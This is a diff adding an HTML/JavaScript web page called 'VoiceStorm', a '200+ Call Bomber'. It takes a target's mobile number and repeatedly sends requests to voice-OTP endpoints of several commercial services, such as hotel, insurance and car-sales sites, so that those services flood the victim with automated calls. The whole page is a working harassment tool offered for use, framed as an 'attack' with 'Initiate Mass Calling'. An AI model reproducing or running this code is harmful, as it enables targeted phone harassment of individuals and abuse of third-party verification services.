@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberCore | 200+ Call Bomber</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background: #fdfdfd; font-family: 'Plus Jakarta Sans', sans-serif; }
+        .input-call { background: #f8fafc; border: 2px solid #f1f5f9; border-radius: 20px; transition: 0.3s; width: 100%; padding: 18px; outline: none; font-weight: 800; color: #ef4444; }
+        .input-call:focus { border-color: #ef4444; background: white; }
+        .btn-call { background: linear-gradient(135deg, #ef4444, #b91c1c); color: white; padding: 20px; border-radius: 24px; font-weight: 900; text-transform: uppercase; width: 100%; transition: 0.4s; box-shadow: 0 10px 20px rgba(239, 68, 68, 0.2); }
+        .btn-call:disabled { background: #e2e8f0; box-shadow: none; cursor: not-allowed; }
+        .terminal-voice { background: #020617; border-radius: 24px; color: #f87171; font-family: 'Courier New', monospace; font-size: 10px; height: 160px; overflow-y: auto; padding: 15px; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+    <div class="max-w-md w-full bg-white p-10 rounded-[3rem] shadow-2xl border border-slate-100 relative overflow-hidden">
+        
+        <div class="flex items-center gap-4 mb-10">
+            <div class="h-14 w-14 bg-red-100 rounded-2xl flex items-center justify-center text-red-600">
+                <i class="fa-solid fa-microphone-lines text-2xl animate-pulse"></i>
+            </div>
+            <div>
+                <h1 class="text-2xl font-black italic tracking-tighter uppercase">Voice<span class="text-red-600">Storm</span></h1>
+                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">200+ Hybrid Voice Nodes</p>
+            </div>
+        </div>
+
+        <div class="space-y-6">
+            <div>
+                <label class="text-[10px] font-black text-slate-400 uppercase ml-2 tracking-widest">Target Mobile</label>
+                <input type="number" id="num" placeholder="Enter 10 Digit Number" class="input-call mt-1">
+            </div>
+
+            <div>
+                <label class="text-[10px] font-black text-slate-400 uppercase ml-2 tracking-widest">Call Loops (Max 50)</label>
+                <input type="number" id="count" value="10" max="50" class="input-call mt-1">
+            </div>
+
+            <button id="callBtn" onclick="launchVoiceAttack()" class="btn-call">Initiate Mass Calling</button>
+
+            <div id="lockUI" class="hidden p-4 bg-red-50 rounded-2xl text-center">
+                <p class="text-[10px] font-black text-red-500 uppercase">
+                    <i class="fa-solid fa-lock mr-1"></i> System Cooling: <span id="timer">60:00</span>
+                </p>
+            </div>
+
+            <div id="progressUI" class="hidden space-y-3 pt-4 border-t border-slate-100">
+                <div class="flex justify-between items-center px-1">
+                    <span class="text-[9px] font-black text-red-500 animate-pulse uppercase">Dialing Network...</span>
+                    <span id="prog" class="text-xs font-black text-slate-700">0/0</span>
+                </div>
+                <div id="log" class="terminal-voice">
+                    > Securing Voice Gateway Nodes...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Highly Versatile Call Nodes (These trigger 100s of sub-services)
+        const callNodes = [
+            "https://api.oyorooms.com/api/v1/voice_otp?phone=", 
+            "https://api.indiamart.com/ims-api/v1/voice/otp?mobile=",
+            "https://api.bigdaddygame.com/voice-auth/",
+            "https://api.rxce.in/user/voice-call?mobile=",
+            "https://api.winzo.com/voice-verification/",
+            "https://api.mall91.com/v1/voice/send?mobile=",
+            "https://api.cardekho.com/v1/voice-otp?phone=",
+            "https://api.bajajfinserv.in/api/v1/voice-trigger?num=",
+            "https://api.policybazaar.com/voice/otp?mobile=",
+            "https://api.policyboss.com/api/v1/call-trigger?phone="
+        ];
+
+        function checkLock() {
+            const end = localStorage.getItem('call_storm_lock');
+            if(end && end > Date.now()) startCooldown(end - Date.now());
+        }
+
+        function startCooldown(ms) {
+            const btn = document.getElementById('callBtn');
+            const lock = document.getElementById('lockUI');
+            const timer = document.getElementById('timer');
+            btn.disabled = true;
+            lock.classList.remove('hidden');
+
+            const iv = setInterval(() => {
+                const rem = localStorage.getItem('call_storm_lock') - Date.now();
+                if(rem <= 0) {
+                    clearInterval(iv);
+                    btn.disabled = false;
+                    lock.classList.add('hidden');
+                    localStorage.removeItem('call_storm_lock');
+                } else {
+                    const m = Math.floor(rem/60000);
+                    const s = Math.floor((rem%60000)/1000);
+                    timer.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                }
+            }, 1000);
+        }
+
+        async function launchVoiceAttack() {
+            const phone = document.getElementById('num').value;
+            const limit = parseInt(document.getElementById('count').value);
+
+            if(phone.length < 10) return alert("Enter valid mobile!");
+            if(limit > 50) return alert("Max limit 50 for Calls!");
+
+            localStorage.setItem('call_storm_lock', Date.now() + 3600000); // 60 min lock
+            
+            document.getElementById('progressUI').classList.remove('hidden');
+            document.getElementById('callBtn').disabled = true;
+
+            for(let i=1; i<=limit; i++) {
+                const node = callNodes[i % callNodes.length];
+                
+                // Fire Voice Call Request
+                fetch(node + phone, { mode: 'no-cors' }).catch(()=>{});
+
+                document.getElementById('prog').innerText = `${i}/${limit}`;
+                
+                const line = document.createElement('div');
+                line.innerText = `[${new Date().toLocaleTimeString()}] Node_Cluster_${(i%20)+1} -> Call Dispatched`;
+                document.getElementById('log').prepend(line);
+
+                // Delay: 15 seconds to allow call completion/refusal
+                await new Promise(r => setTimeout(r, 15000)); 
+            }
+
+            alert("Voice Storm Finished!");
+            startCooldown(3600000);
+        }
+
+        checkLock();
+    </script>
+</body>
+</html>
